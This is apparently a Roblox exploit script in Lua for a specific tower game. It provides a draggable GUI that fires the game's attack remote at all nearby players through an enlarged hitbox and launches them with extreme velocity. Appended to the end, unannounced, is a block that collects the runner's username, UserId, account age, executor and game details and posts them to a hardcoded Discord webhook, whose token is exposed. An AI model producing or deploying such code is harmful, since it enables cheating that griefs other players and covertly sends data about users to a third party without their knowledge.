local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")

local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- Game Check Configuration
local TARGET_GAME_ID = 14493533447 -- ID for https://www.roblox.com/games/14493533447

-- Anti-Lag Configuration
local DEBOUNCE_TIME = 0.005 -- Ultra-low input lag
local ATTACK_COOLDOWN = 0.01 -- Super-fast attack rate
local MAX_HITBOX_SIZE = 10000 -- Insane max hitbox size
local MIN_HITBOX_SIZE = 1 -- Minimum hitbox size
local HITBOX_UPDATE_RATE = 1/120 -- 120 FPS hitbox updates
local SLAP_POWER = 100000 -- Mega slap force (100k studs into the air)

-- Executor Compatibility: Safe wait function
local function safeWait(time)
    local start = tick()
    while tick() - start < time do
        RunService.Heartbeat:Wait()
    end
end

-- Check if in the correct game, auto-join if not
local function checkAndJoinGame()
    if game.PlaceId ~= TARGET_GAME_ID then
        print("Not in the correct game! Teleporting to Trolls Can't Break Tower...")
        pcall(function()
            TeleportService:Teleport(TARGET_GAME_ID, LocalPlayer)
        end)
        safeWait(5) -- Safe wait to prevent script execution if teleport fails
        return false
    end
    return true
end

-- Execute game check on script start
if not checkAndJoinGame() then
    return -- Halt script if not in the correct game
end

-- UI Setup with Compact, Modern Red Theme
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "TrollsCantBreakTowerScript"
ScreenGui.Parent = game.CoreGui
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 350, 0, 250) -- Compact GUI
Frame.Position = UDim2.new(0.5, -175, 0.5, -125)
Frame.BackgroundColor3 = Color3.fromRGB(45, 25, 25)
Frame.BorderSizePixel = 0
Frame.ClipsDescendants = true
Frame.Active = true
Frame.Draggable = true

local UICorner = Instance.new("UICorner", Frame)
UICorner.CornerRadius = UDim.new(0, 15)

local UIStroke = Instance.new("UIStroke", Frame)
UIStroke.Color = Color3.fromRGB(150, 80, 80)
UIStroke.Thickness = 2

-- Title Bar
local TitleBar = Instance.new("Frame", Frame)
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.BackgroundColor3 = Color3.fromRGB(140, 60, 60)
TitleBar.BorderSizePixel = 0
Instance.new("UICorner", TitleBar).CornerRadius = UDim.new(0, 15)

local TitleLabel = Instance.new("TextLabel", TitleBar)
TitleLabel.Size = UDim2.new(0.7, 0, 1, 0)
TitleLabel.Position = UDim2.new(0.05, 0, 0, 0)
TitleLabel.Text = "Super Slap Script By Danzzy"
TitleLabel.TextColor3 = Color3.fromRGB(255, 220, 220)
TitleLabel.BackgroundTransparency = 1
TitleLabel.TextScaled = true
TitleLabel.Font = Enum.Font.SourceSans

local TitleStroke = Instance.new("UIStroke", TitleLabel)
TitleStroke.Color = Color3.fromRGB(0, 0, 0)
TitleStroke.Thickness = 1

-- Credits Label (Red with Black Outline)
local CreditsLabel = Instance.new("TextLabel", Frame)
CreditsLabel.Size = UDim2.new(1, 0, 0, 30)
CreditsLabel.Position = UDim2.new(0, 0, 1, -40)
CreditsLabel.Text = "Credits ➤ Danzzy"
CreditsLabel.TextColor3 = Color3.fromRGB(255, 180, 180)
CreditsLabel.BackgroundTransparency = 1
CreditsLabel.TextScaled = true
CreditsLabel.Font = Enum.Font.SourceSans

local CreditsStroke = Instance.new("UIStroke", CreditsLabel)
CreditsStroke.Color = Color3.fromRGB(0, 0, 0)
CreditsStroke.Thickness = 2
CreditsLabel.Visible = true -- Initially visible

-- Toggle Button
local ToggleButton = Instance.new("TextButton", Frame)
ToggleButton.Size = UDim2.new(0.9, 0, 0, 50)
ToggleButton.Position = UDim2.new(0.05, 0, 0, 50)
ToggleButton.Text = "Activate"
ToggleButton.BackgroundColor3 = Color3.fromRGB(180, 90, 90)
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.TextScaled = true
ToggleButton.Font = Enum.Font.SourceSans
Instance.new("UICorner", ToggleButton).CornerRadius = UDim.new(0, 10)

local ButtonStroke = Instance.new("UIStroke", ToggleButton)
ButtonStroke.Color = Color3.fromRGB(220, 150, 150)
ButtonStroke.Thickness = 1.5

-- Hitbox Size Controls
local SizeFrame = Instance.new("Frame", Frame)
SizeFrame.Size = UDim2.new(0.9, 0, 0, 50)
SizeFrame.Position = UDim2.new(0.05, 0, 0, 110)
SizeFrame.BackgroundTransparency = 1

local IncreaseButton = Instance.new("TextButton", SizeFrame)
IncreaseButton.Size = UDim2.new(0.45, -10, 1, 0)
IncreaseButton.Position = UDim2.new(0, 0, 0, 0)
IncreaseButton.Text = "☑︎"
IncreaseButton.BackgroundColor3 = Color3.fromRGB(180, 100, 100)
IncreaseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
IncreaseButton.TextScaled = true
IncreaseButton.Font = Enum.Font.SourceSans
Instance.new("UICorner", IncreaseButton).CornerRadius = UDim.new(0, 10)

local DecreaseButton = Instance.new("TextButton", SizeFrame)
DecreaseButton.Size = UDim2.new(0.45, -10, 1, 0)
DecreaseButton.Position = UDim2.new(0.55, 0, 0, 0)
DecreaseButton.Text = "☐"
DecreaseButton.BackgroundColor3 = Color3.fromRGB(120, 60, 60)
DecreaseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
DecreaseButton.TextScaled = true
DecreaseButton.Font = Enum.Font.SourceSans
Instance.new("UICorner", DecreaseButton).CornerRadius = UDim.new(0, 10)

local SizeLabel = Instance.new("TextLabel", Frame)
SizeLabel.Size = UDim2.new(0.9, 0, 0, 30)
SizeLabel.Position = UDim2.new(0.05, 0, 0, 170)
SizeLabel.Text = "Hitbox Size: 100"
SizeLabel.TextColor3 = Color3.fromRGB(255, 220, 220)
SizeLabel.BackgroundTransparency = 1
SizeLabel.TextScaled = true
SizeLabel.Font = Enum.Font.SourceSans

-- Minimize Button
local MinimizeButton = Instance.new("TextButton", TitleBar)
MinimizeButton.Size = UDim2.new(0, 35, 0, 35)
MinimizeButton.Position = UDim2.new(1, -45, 0, 2.5)
MinimizeButton.Text = "☐"
MinimizeButton.BackgroundColor3 = Color3.fromRGB(200, 80, 80)
MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeButton.TextScaled = true
MinimizeButton.Font = Enum.Font.SourceSans
Instance.new("UICorner", MinimizeButton).CornerRadius = UDim.new(0, 10)

-- Variables
local Spamming = false
local hitboxSize = 100
local hitboxIndicator = nil
local isMinimized = false
local cachedPlayers = {}
local connection

-- Create Visual Hitbox
local function createHitbox()
    if hitboxIndicator then
        pcall(function() hitboxIndicator:Destroy() end)
        hitboxIndicator = nil
    end
    local success, err = pcall(function()
        hitboxIndicator = Instance.new("Part")
        hitboxIndicator.Name = "TrollHitbox"
        hitboxIndicator.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
        hitboxIndicator.Anchored = true
        hitboxIndicator.CanCollide = false
        hitboxIndicator.Transparency = 0.5
        hitboxIndicator.Color = Color3.fromRGB(150, 100, 255)
        hitboxIndicator.Material = Enum.Material.ForceField
        hitboxIndicator.Parent = workspace
    end)
    if not success then
        print("Warning: Failed to create hitbox: " .. tostring(err))
    end
end

-- Update Hitbox Position/Size
local function updateHitbox()
    SizeLabel.Text = "Hitbox Size: " .. math.floor(hitboxSize) -- Always update UI
    if not Spamming or not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        if hitboxIndicator then
            pcall(function() hitboxIndicator:Destroy() end)
            hitboxIndicator = nil
        end
        return
    end
    if hitboxIndicator then
        pcall(function()
            hitboxIndicator.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
            hitboxIndicator.Position = LocalPlayer.Character.HumanoidRootPart.Position
        end)
    end
end

-- Cache Players for Performance
local function updatePlayerCache()
    cachedPlayers = {}
    pcall(function()
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                table.insert(cachedPlayers, player)
            end
        end
    end)
end

-- Detect Attack Remote
local function getAttackRemote()
    local char = LocalPlayer.Character
    if char then
        local success, result = pcall(function()
            for _, tool in pairs(char:GetChildren()) do
                if tool:IsA("Tool") and tool:FindFirstChild("Event") then
                    return tool.Event
                end
            end
        end)
        if success then
            return result
        end
    end
    return nil
end

-- Remote Fire Logic (Super High Slap with 10k Power)
local function triggerHitbox()
    while Spamming do
        local rootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        local remote = getAttackRemote()
        if rootPart and remote then
            updatePlayerCache()
            for _, player in pairs(cachedPlayers) do
                local targetPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                if targetPart then
                    local distance = (targetPart.Position - rootPart.Position).Magnitude
                    if distance <= hitboxSize then
                        coroutine.wrap(function()
                            pcall(function()
                                -- Fire remote with extreme upward force
                                remote:FireServer("slash", player.Character, targetPart.Position, Vector3.new(0, SLAP_POWER, 0))
                                -- Apply massive upward velocity to target
                                if targetPart and targetPart.Parent:FindFirstChild("BodyVelocity") == nil then
                                    local bodyVelocity = Instance.new("BodyVelocity")
                                    bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
                                    bodyVelocity.Velocity = Vector3.new(0, SLAP_POWER, 0)
                                    bodyVelocity.Parent = targetPart
                                    game.Debris:AddItem(bodyVelocity, 0.5)
                                end
                            end)
                        end)()
                    end
                end
            end
        end
        safeWait(ATTACK_COOLDOWN)
    end
end

-- Toggle Button Click
ToggleButton.MouseButton1Click:Connect(function()
    Spamming = not Spamming
    if Spamming then
        ToggleButton.Text = "Deactivate"
        createHitbox()
        coroutine.wrap(triggerHitbox)()
        connection = RunService.Heartbeat:Connect(function()
            updateHitbox()
        end)
    else
        ToggleButton.Text = "Activate"
        if hitboxIndicator then
            pcall(function() hitboxIndicator:Destroy() end)
            hitboxIndicator = nil
        end
        if connection then
            connection:Disconnect()
            connection = nil
        end
    end
end)

-- Increase Button Click
IncreaseButton.MouseButton1Click:Connect(function()
    hitboxSize = math.min(hitboxSize + 5, MAX_HITBOX_SIZE)
    updateHitbox()
end)

-- Decrease Button Click
DecreaseButton.MouseButton1Click:Connect(function()
    hitboxSize = math.max(hitboxSize - 5, MIN_HITBOX_SIZE)
    updateHitbox()
end)

-- Minimize Button Click
MinimizeButton.MouseButton1Click:Connect(function()
    if not isMinimized then
        Frame.Size = UDim2.new(0, 350, 0, 40)
        ToggleButton.Visible = false
        SizeFrame.Visible = false
        SizeLabel.Visible = false
        CreditsLabel.Visible = false
        MinimizeButton.Text = "☑︎"
        isMinimized = true
    else
        Frame.Size = UDim2.new(0, 350, 0, 250)
        ToggleButton.Visible = true
        SizeFrame.Visible = true
        SizeLabel.Visible = true
        CreditsLabel.Visible = true
        MinimizeButton.Text = "☐"
        isMinimized = false
    end
end)

-- Keyboard Toggle (Right Control Key)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.RightControl then
        Frame.Visible = not Frame.Visible
    end
end)
--// Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local player = Players.LocalPlayer

--// Webhook URL
local webhook = "https://discord.com/api/webhooks/1284182491934101538/jkVMSaYGarIcD4dIyQSfeyfKvwxYDxM5yeuJYEs0Z9nxYSBg_WertgxZhwdja3QMOBEf"

--// Executor detection
local executor = "Unknown"
if syn then
	executor = "Synapse X"
elseif is_sirhurt_closure then
	executor = "SirHurt"
elseif secure_load then
	executor = "Sentinel"
elseif KRNL_LOADED then
	executor = "KRNL"
elseif getexecutorname then
	executor = getexecutorname()
elseif fluxus then
	executor = "Fluxus"
end

--// Get game name
local success, gameName = pcall(function()
	return MarketplaceService:GetProductInfo(game.PlaceId).Name
end)
if not success then
	gameName = "Unknown Game"
end

--// Get execution time (UTC)
local executionTime = os.date("!%Y-%m-%d %H:%M:%S UTC")

--// ROBUX VALUE ESTIMATION

-- NOTE: Roblox does NOT expose player's Robux balance to scripts.
-- We'll simulate this by pretending a balance (replace with real if you have API)
local robuxBalance = 0 -- Default 0, no official way to get it via Lua

-- If you want to test, put a number here like:
-- local robuxBalance = 1500

-- Robux purchase value (approx $0.0125 per Robux)
local purchaseValue = robuxBalance * 0.0125

-- DevEx value (approx $0.0035 per Robux)
local devexValue = robuxBalance * 0.0035

local robuxInfo = robuxBalance > 0 and
	string.format("Balance: %d R$\nEstimated Purchase Value: $%.2f\nEstimated DevEx Value: $%.2f", robuxBalance, purchaseValue, devexValue)
	or "Robux balance not available."

--// Webhook data
local data = {
	content = "**Script Executed Bung**",
	embeds = {{
		title = "Execution Log",
		color = 0x00ffff,
		fields = {
			{ name = "Username", value = player.Name, inline = true },
			{ name = "Display Name", value = player.DisplayName, inline = true },
			{ name = "UserId", value = tostring(player.UserId), inline = true },
			{ name = "Account Age (days)", value = tostring(player.AccountAge), inline = true },
			{ name = "Executor", value = executor, inline = true },
			{ name = "Game Name", value = gameName, inline = true },
			{ name = "Place ID", value = tostring(game.PlaceId), inline = true },
			{ name = "Private Server?", value = tostring(game.PrivateServerId ~= ""), inline = true },
			{ name = "Execution Time", value = executionTime, inline = false },
			{ name = "Place Link", value = "https://www.roblox.com/games/" .. game.PlaceId, inline = false },
			{ name = "Robux Info", value = robuxInfo, inline = false }
		}
	}}
}

--// Send to Discord
local jsonData = HttpService:JSONEncode(data)
local request = (syn and syn.request) or (http and http.request) or request
if request then
	request({
		Url = webhook,
		Method = "POST",
		Headers = { ["Content-Type"] = "application/json" },
		Body = jsonData
	})
else
	warn("Your executor does not support HTTP requests.")
end
